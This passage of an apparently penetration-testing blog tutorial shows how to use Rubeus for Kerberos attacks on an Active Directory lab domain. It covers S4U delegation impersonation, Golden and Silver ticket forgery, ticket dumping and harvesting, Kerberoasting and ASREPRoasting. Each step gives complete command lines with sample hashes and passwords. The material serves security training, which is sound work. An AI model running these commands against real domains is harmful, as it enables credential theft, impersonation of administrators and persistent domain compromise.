+<p><span style="color: #000000;">We saw above how we can generate hashes using Rubeus. Now let’s talk about one such attack where hashes can be used to impersonate another user and carry out delegation attacks. For a detailed write-up on delegation, and attacks follow the link <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/">here</a></strong></span>. In short, OS post-Windows server 2003 contained a Kerberos protocol extension called s4uself and s4uproxy. These protocols can be used to conduct delegation attacks. For example, in the example below, we have performed an attack called “Resource-Based Constrained Delegation” which benefits the <strong>msDS-AllowedToActOnBehalfOfAnotherIdentity</strong> option set in the attribute’s editor. Follow the article <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/">here</a> </strong></span>for a full attack. In the example below, we’ll use the user noob’s hash and then impersonate Administrator account.</span></p>
+<p><span style="color: #000000;">/rc4: The system uses the flag to provide user noob’s account.</span></p>
+<p><span style="color: #000000;">/impersonateuser: Noob will impersonate the user.</span></p>
+<p><span style="color: #000000;">/msdsspn: The account needs a valid msDS-AllowedToActOnBehalfOfAnotherIdentity value. Here, the domain controller</span></p>
+<p><span style="color: #000000;">/altservice: You can supply one or more service names to substitute in the resulting .kirbi file.</span></p>
+<p><span style="color: #000000;">/ptt: Injects the resulting ticket in the current terminal session</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe s4u /user:noob$ /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /impersonateuser:Administrator /msdsspn:host/dc1.ignite.local /altservice:cifs /domain:ignite.local /ptt</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw/s16000/18.png" alt="Rubeus Guide" width="814" height="723"/></span></p>
+<p><span style="color: #000000;">This would generate a ticket for Administrator user over the specified SPN. In short, we can now act as DC.</span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A/s16000/19.png"/><br/>
+</strong></span></p>
+<h3><span style="color: #800000;">Golden Ticket</span></h3>
+<p><span style="color: #000000;">Attackers forge Golden tickets as KRBTGTs (Key Distribution Service accounts) to create other TGTs. This provides an attacker persistence over the domain accounts. For a detailed walkthrough on the topic you can visit the article <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;">To forge a golden ticket for user harshitrajpal, we first generate an AES hash (RC4 works too) using the hash command in Rubeus and then using the golden function like so. Here,</span></p>
+<p><span style="color: #000000;">/ldap: Retrieves user information over LDAP protocol.</span></p>
+<p><span style="color: #000000;">/user: Username for which the ticket will be forged.</span></p>
+<p><span style="color: #000000;">/printcmd: Displays a one-liner command that generates the ticket again that was just generated.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1
+rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:harshitrajpal /printcmd</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA/s16000/20.png" alt="Rubeus Guide" width="872" height="742"/></span></p>
+<p><span style="color: #000000;">As you can see, we fetch various details like SID, userID, Service Key, etc., over LDAP, which are important to generate a ticket. We also perform PAC signing and generate a TGT for harshitrajpal.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">Also, at the end you’ll see a one liner command that can be used to generate this TGT again.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ/s16000/22.png" alt="Rubeus Guide" width="818" height="205"/></span></p>
+<p><span style="color: #000000;">Various other options can modify the generated TGT in conjunction with Golden like:</span></p>
+<p><span style="color: #000000;">/rangeinterval: After every time specified, the system generates a new ticket.</span></p>
+<p><span style="color: #000000;">/rangeend: The setting specifies the maximum time for generating tickets. Here, 5 days. Since rangeinterval is 1d, the system generates 5 different tickets.</span></p>
+<p><span style="color: #000000;">For a full list of modifications, see <a style="color: #000000;" href="https://github.com/GhostPack/Rubeus#ticket-forgery">this</a> page.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ/s16000/23.png"/></strong></span></p>
+<h3><span style="color: #800000;">Silver Ticket</span></h3>
+<p><span style="color: #000000;">Attackers forge Silver tickets, which are Kerberos Ticket Granting Service (TGS) Tickets, but they do not communicate with the domain controller. The service account configured with an SPN for each server running the Kerberos-authenticating service signs the ticket. For more details visit the page <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://adsecurity.org/?p=2011">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;">Attackers can perform a silver ticket attack using Rubeus’s silver function. They need to make other customisations like:</span></p>
+<p><span style="color: #000000;">/service: SPN of the service ticket being generated for</span></p>
+<p><span style="color: #000000;">/rc4: Hash of a valid user (harshitrajpal here) that will be used to encrypt the generated ticket</span></p>
+<p><span style="color: #000000;">/user: username of the user whose hash is provided</span></p>
+<p><span style="color: #000000;">/creduser: User to impersonat</span></p>
+<p><span style="color: #000000;">/credpassword: Password of the user to impersonate</span></p>
+<p><span style="color: #000000;">/krbkey: used to create the KDCChecksum and TicketChecksum. This is the AES256 hmac sha1 hash in the following case.</span></p>
+<p><span style="color: #000000;">/krbenctype: type of encrypted hash used. Aes256 here.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1
+rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA/s16000/24.png"/></span></p>
+<p><span style="color: #000000;">This helped us generate a silver ticker for Administrator account. And as a result, we are now able to access DC machine’s C drive</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dir \\dc1.ignite.local\c$</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA/s16000/25.png" alt="Rubeus Guide" width="488" height="339"/></span></p>
+<h3><span style="color: #800000;">Ticket Management</span></h3>
+<p><span style="color: #000000;">Rubeus contains multiple ticket management options that may aid a pentester to conduct operations effectively and stealthily. As a pentester, we need to manage our generated tickets.</span></p>
+<h4><span style="color: #000000;">Ptt</span></h4>
+<p><span style="color: #000000;">The Rubeus ptt option can import the supplied ticket in command line. The /ptt can also be used in conjunction with other options that output tickets. For example,</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe ptt /ticket:doIFNDCCBTCgAwI...bA==</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA/s16000/26.png"/></span></p>
+<p><span style="color: #000000;">As you can see, the generated ticket has now been imported.</span></p>
+<h4><span style="color: #000000;">Purge</span></h4>
+<p><span style="color: #000000;">Rubeus has a purge option which can purge/delete all the tickets existing in the current session.</span></p>
+<p><span style="color: #000000;">Here, we demonstrate how we purged 2 tickets listed by klist.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe purge</pre>
+<p><span style="color: #000000;"><strong><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg/s16000/27.png" alt="Rubeus Guide" width="650" height="881"/><br/>
+</strong></span></p>
+<h4><span style="color: #000000;">Describe</span></h4>
+<p><span style="color: #000000;">Often we lose track of the tickets in system. Describe option helps us to view details about a particular base64 encrypted blob or ticket.kirbi file.</span></p>
+<p><span style="color: #000000;">We can provide the ticket using /ticket flag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe describe /ticket:doIFNDCCBTCg...bA==</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A/s16000/28.png"/></span></p>
+<h4><span style="color: #000000;">Triage</span></h4>
+<p><span style="color: #000000;">While klist views tickets for current session triage lists all the tickets. When an administrator runs a session, we can not only view tickets in the current user’s session memory but also other users’ tickets in memory too.</span></p>
+<p><span style="color: #000000;">/luid: You can use this flag to provide a specific user ID.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe triage
+rubeus.exe triage /luid:0x8f57c</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w/s16000/29.png" alt="Rubeus Guide" width="838" height="928"/></span></p>
+<p><span style="color: #000000;">Also, when the LUID is known, we can purge a particular user’s tickets too (elevated mode only)</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe purge /luid:0x8f57c</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ/s16000/30.png"/><br/>
+</strong></span></p>
+<h4><span style="color: #000000;">Dump</span></h4>
+<p><span style="color: #000000;">If the session is running in an elevated mode, a user can dump/ extract all the current TGTs and service tickets. Again, /luid can be provided to dump a specific user’s tickets. /service can be used to filter these tickets.</span></p>
+<p><span style="color: #000000;">For example, /service:krbtgt displays only TGTs.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe dump</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw/s16000/31.png"/></span></p>
+<p><span style="color: #000000;">For a specific service like only krbtgt:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe dump /service:krbtgt</pre>
+<p><span style="color: #000000;"><strong><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhuK3I9Opl6VOjjSVV4RZUweVLtYtkrE_QijIFiIuYzB99oYl5IxcS4cHoWQ8MQaCB4EqgqzyP0-ZP-VWv8tbrDqS5FEXZcbFLPSHY7taMEAJUDz7jp_Rv7Vnzxsf8nX8-hZ1B_zOOELylZd8qt8aZYseuuK0rK6t24aYV-A8XKuNgbntU-zEDP01jyfA/s16000/32.png" alt="Rubeus Guide" width="614" height="537"/><br/>
+</strong></span></p>
+<h4><span style="color: #000000;">Tgtdeleg</span></h4>
+<p><span style="color: #000000;">Tgtdeleg is Benjamin Delpy’s technique that can exploit the Generic Security Service Application Program Interface (GSS-API) trick and allows you to extract a usable TGT .kirbi file from the current user’s session in low elevation mode. This Windows API can be used to request a delegate TGT that’s intended to be sent to a remote host/SPN.</span></p>
+<p><span style="color: #000000;">This can be done like:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe tgtdeleg</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUKi9so9HwiidLh4qrww3Nbfa54h8MEOXPWhf7E7w64HnnpDBNSU0fOULt8M86hSLZokXvV_1YUWJEMqyMj2YOUUsBlF6hpKIRIK5cCId84CxVDWoPTNneD1TkHTpmi5FMXFfPodTGu1I67AdqxbDyYBoxEwHHw-VOkzwItS2Ou2rx8C4SbJBsPdzc0A/s16000/33.png"/></span></p>
+<p><span style="color: #000000;">As you can see, the current user’s TGT has been dumped successfully.</span></p>
+<h4><span style="color: #000000;">Monitor</span></h4>
+<p><span style="color: #000000;">The monitor function can periodically extract all TGTs every x seconds, where x is the variable provided in the /interval flag.</span></p>
+<p><span style="color: #000000;">/targetuser: Only the specified user’s tickets will be returned.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe monitor /targetuser:noob$ /interval:10</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxjB0KxfUmaAPMCLqCPamfo7oWirey_9jFiNPldQ0MGajwBSeep05jP8WLM9xIkEyuRJDh3JiTEhTvzeVZZ6ZND5Ugp0Yt-94bCAb-bkE1Oh-n2Bi55_-ub8_0Sq55ORZunuoEC0Xuo4pNK3anojLhI9ugmhWz95wy2yocUV14Jf5rJk4wOEeQAwZcMw/s16000/34.png" alt="Rubeus Guide" width="593" height="278"/></span></p>
+<h4><span style="color: #000000;">Harvest</span></h4>
+<p><span style="color: #000000;">The harvest option extracts TGTs every x seconds, where the /interval flag provides x, and it also maintains a cache of any extracted TGTs while it autorenews any tickets about to expire.</span></p>
+<p><span style="color: #000000;">/nowrap filter: Displays tickets in a single line (very helpful)</span></p>
+<p><span style="color: #000000;">/runfor: Can specify the end time of harvest option</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe harvest /interval:30</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhblt2mvrwOxXES3BxOqsSuqsNzpoVnkMvy6FZv_AiR-6Te08TnXZJSeySEwxCZpvgntHTp-C5YsudZjtHT0ly7beAumcqaZ-cO0Hjh9PrYBLHCFABIY2HrG3cs3q_t0wnn5sXlmBLgxFL_UXS-vNfGMd4RYw7OAUQdrHf9NBpgmiJsIyi3Qxxwoaktqg/s16000/35.png"/></span></p>
+<h3><span style="color: #800000;">Kerberoasting</span></h3>
+<p><span style="color: #000000;">An attacker uses the technique of <strong>Kerberoasting</strong> to steal the <strong>KRB_TGS</strong> ticket, which RC4 encrypts, and then brute-forces the application service’s hash to extract its password. <strong data-start="434" data-end="446">Kerberos</strong> uses the <strong data-start="456" data-end="469">NTLM hash</strong> of the requested <strong data-start="487" data-end="498">service</strong> to encrypt the <strong data-start="514" data-end="525">KRB_TGS</strong> ticket for the given <strong data-start="543" data-end="577">Service Principal Names (SPNs)</strong>. When a <strong data-start="586" data-end="601">domain user</strong> sends a request for a TGS ticket to the <strong data-start="642" data-end="649">KDC</strong>, the controller generates the <strong data-start="680" data-end="691">KRB_TGS</strong> without verifying the user’s authorization against the requested service.</span></p>
+<p><span style="color: #000000;">Consequently, an attacker can use this ticket offline to brute-force the service account’s password, since RC4 encrypts the ticket with the account’s NTLM hash.</span></p>
+<p><span style="color: #000000;">For a detailed guide on Kerberoasting, see our article <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/">here</a></strong></span>.</span></p>
+<h5><span style="color: #000000;">Kerberoasting using Rubeus for a specified SPN</span></h5>
+<p><span style="color: #000000;">To perform <strong data-start="1055" data-end="1072">Kerberoasting</strong> using <strong data-start="1079" data-end="1089">Rubeus</strong> for a specified <strong data-start="1106" data-end="1113">SPN</strong>, you can use the</span> <strong>/spn</strong><span style="color: #000000;"> flag:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgSG6KQOcQoWYpF5MzdoWkUhvbfh-wHE4gxP8O6Yl4voZ3JnKq8oVwXRaSa40UnCuxwo3m1DrgGwZMXGBuiq4C0doAbwWsIyI0GI4birFo3bUjathTtpr8urL682N2quqoV-7QBYra87w90v1ma5x9YJ7zklACIW8KL5zrboywrK_gg7YCsoUMzZkWZWw/s16000/36.png" alt="Rubeus Guide" width="745" height="698"/></span></p>
+<p><span style="color: #000000;">As you can see above, <strong data-start="1238" data-end="1255">Kerberoasting</strong> has dumped a valid <strong data-start="1275" data-end="1292">Kerberos hash</strong> for the <strong data-start="1301" data-end="1317">LDAP service</strong>, which you can crack using <strong data-start="1345" data-end="1356">Hashcat</strong> with <strong data-start="1362" data-end="1378">module 13100</strong>.</span></p>
+<p><span style="color: #000000;">You can use /tgtdeleg to perform the <strong data-start="1425" data-end="1449">TGT delegation trick</strong> to roast all <strong data-start="1463" data-end="1478">RC4-enabled</strong> accounts:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /tgtdeleg</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkbBpTLaMY-3Oo9rO9snMDKjIzxFYSYrFpxM5rWMJzRvA0IYcHQq3Nf7FIMujlKMYice4nIEwcd4TD3mjwwO_E0TGXxrIIOV0kp2XyO205NBksAAFyOQpEt5EGGHRMfFtis2OU1Qnr2Sg_jlc-UGqDfMrUqMZQK4KrqEYIDogewDQpwked05vSgVp0kg/s16000/37.png"/></span></p>
+<p><span style="color: #000000;">Use the /aes flag to roast all <strong data-start="1609" data-end="1624">AES-enabled</strong> accounts while using <strong data-start="1646" data-end="1680">KerberosRequestorSecurityToken</strong>:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /aes</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCoQ50F_1zB4Ssky8pAVoQ9YFszN5PCxxdLFrrwh3uDnas-R7TsDO-Wnlp2BDGuDfWys30kjQpzGKXasJqTVyGXSWiT3MZb6dQdls1LMrETa5r40cr7leJ3HCoeewdJ54MHhQ1Yxrk6DRt-liZmHsNxXZqJzK_EX2GiWaC2i2UUUEXJ0DKrBwti5AuLw/s16000/38.png" alt="Rubeus Guide" width="745" height="733"/></span></p>
+<p><span style="color: #000000;">Alternatively, provide <strong data-start="1787" data-end="1809">domain credentials</strong> using<strong>/creduser</strong> and <strong>/credpassword</strong> to perform Kerberoasting:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /creduser:ignite.local\Administrator /credpassword:Ignite@987</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9KDywl9UQrBQ_k5tNavZy2rdV4VevX_uDu-PfN6w1FtoOQq9KqhwNCxOZao16bEy6ivWwEJSdCtd0aXz3blftnWjWk24shGO9yqyuyUgWnqTZHgK6oY54G21x_4-dWrPowZzfs_F_J3qDqaR3I6ZLlkBOaCbfMlO3Jh0qBoweOcJ0Y5c-qYGxHnOpag/s16000/39.png"/></span></p>
+<p class="" data-start="2013" data-end="2062"><span style="color: #000000;">You can also specify customization flags such as:</span></p>
+<p class="" data-start="2066" data-end="2169"><span style="color: #000000;">/pwdsetbefore: Format MM-dd-yyyy – roasts accounts that last changed their password before this date.</span></p>
+<p class="" data-start="2172" data-end="2228"><span style="color: #000000;">/resultlimit: Limits the number of accounts to roast.</span></p>
+<p class="" data-start="2231" data-end="2301"><span style="color: #000000;">/delay: Adds milliseconds delay between two consecutive TGS requests.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /pwdsetbefore:08-05-2022 /resultlimit:3 /delay:1000</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgGp2n7e_k6PIrVWMoAU5Ar5ssxs8-0MGH8W0INUgzVeXal59GlklOm3t3BT7Rq2jA6uFIfuwjv_E3mUlrffZMHF3AlYNdaZwpN1fVDgf5BnUY-hmhgFprtyH7qSwM5hjgV7uk211JhlIcUAx7tZkVdbCs4MUDRo-0J_Sa49FIfHDbYQtLVSN7bnX8NFg/s16000/40.png"/></span></p>
+<p><span style="color: #000000;">Moreover, use /rc4opsec to apply the <strong data-start="2470" data-end="2494">TGT delegation trick</strong> and target accounts <strong data-start="2515" data-end="2538">without AES enabled</strong>:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /rc4opsec</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhAwyrDOtkPzh5LZbcfsZJ9FEocNKV-9il9JGWPR_HaTaMnAC5UWRBB_TUM7x88GTadvhrKsKgUVkEK5khHZBWMKQ1ewZJ9A3HLH9aNXMniZmKIaohYFn1ECH99zFXN6t2PjXi0DYUEA0YyS5TXgl5GqsllIxpGfYKs0UGgtdZ1UUphEaPAsz7kBX5eyA/s16000/41.png" alt="Rubeus Guide" width="785" height="522"/></span></p>
+<p><span style="color: #000000;">You can also use /simple to output <strong data-start="2664" data-end="2674">hashes,</strong> one per line and /nowrap to avoid <strong data-start="2711" data-end="2728">line wrapping</strong>:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /simple /nowrap</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7Ga9vyUX0uTt8hOdko2dAXvg_37pOggHFM-XFDyVJkVPs-bSR2kz_PcYBNydinv6pm_OqXvl8NIr9fj0RhqHUp_SWZg46WHmJqfnbfd2mJJOLTl7V5kK2IMYChbs8gyZ_iakZkma6kgq_RWmONXPI821P8VgveNa_ntvkPkJsvLIf90eQsQR-2c13Nw/s16000/42.png"/></span></p>
+<p><span style="color: #000000;">Finally, use /outfile to store the hashes in a file:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /outfile:type.hash</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhra04QzY_hGAahQiNOKXRPotFRPSk-XpAa9vFn51feR8w1I6BJEIHKBxZeoFzUnAWuLWV7D_Ubs21aMCtfDMeF6q_im5O4PjQiitD0_OdsuK9vds5BhlBPgo41tNjedqMMfnUu1bmeQpSmrAMoflWYQtC-iSZHdAyDjDdfRv9zOvh9b_2oR6B9aUvOMg/s16000/43.png" alt="Rubeus Guide" width="848" height="382"/></span></p>
+<h3><span style="color: #800000;">ASREPRoast</span></h3>
+<p><span style="color: #000000;">To obtain a <strong data-start="3002" data-end="3020">service ticket</strong>, the <strong data-start="3026" data-end="3052">client first validates</strong> using <strong data-start="3059" data-end="3081">pre-authentication</strong>. However, if the <strong data-start="3099" data-end="3133">pre-authentication requirement</strong> is disabled for an account, the user becomes vulnerable to <strong data-start="3193" data-end="3210">ASREPRoasting</strong>.</span></p>
+<p><span style="color: #000000;">When the “Do not use Kerberos pre-authentication” setting is enabled, attackers can recover a Kerberos AS-REP that encrypts the user’s RC4-HMAC password and then attempt to crack the ticket offline.</span></p>
+<p><span style="color: #000000;">You can read our detailed article <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/as-rep-roasting/">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;">To specify an SPN for <strong data-start="3533" data-end="3547">ASREPRoast</strong>, use the following:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe asreproast /spn:ldap/dc1.ignite.local/ignite.local</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi9YcQHUZ1nFjYCfAWOyN2pEuNCywh46vLpyGSu27NaKLskdKkOOazFAiWt1-hWuxJAPRYd6cPK2vNtFsoUgpEbioFP9L52kef0KDwBupPpn03q3p-md-TYm9mkVngcwiT8UCkSB5GNC7hGjZPdueSiuV_0QnjSvvUVPZ8zPCuvIFXlpQbZNcwn5hQH9g/s16000/44.png"/></span></p>
+<p><span style="color: #000000;">As you can see, accounts with <strong data-start="3670" data-end="3701">pre-authentication disabled</strong> are vulnerable, and their <strong data-start="3728" data-end="3745">AS-REP hashes</strong> have been dumped.</span></p>
